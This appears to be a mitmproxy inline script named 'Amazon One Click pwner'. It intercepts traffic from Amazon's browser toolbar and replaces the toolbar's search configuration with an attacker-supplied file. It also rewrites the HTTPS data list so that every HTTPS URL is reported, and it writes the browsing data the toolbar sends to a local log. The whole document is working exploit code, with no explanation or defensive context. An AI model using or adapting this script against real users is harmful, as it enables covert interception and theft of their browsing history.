#!/usr/bin/env python

def start(sc):
    sc.log("Amazon One Click pwner started")

def response(sc, f):
    if f.request.path.startswith('/gp/bit/toolbar/3.0/toolbar/search_conf.js'):
        f.response.decode() # removes gzip header
        f.response.content = open('pwn.json','r').read()
    elif f.request.path.startswith('/gp/bit/toolbar/3.0/toolbar/httpsdatalist.dat'):
        f.response.decode() # removes gzip header
        f.response.content = '["https://"]' # log'em all


def request(sc, f):
    if f.request.path.startswith('/traffic/rankr/'):
        q = f.request.get_query()
        p = q.get_first('ref')
        if p and f.request.content:
            c = open('pwn.log', 'a')
            c.write(p + "\n" + f.request.get_decoded_content() + "\n============\n")
            c.close()

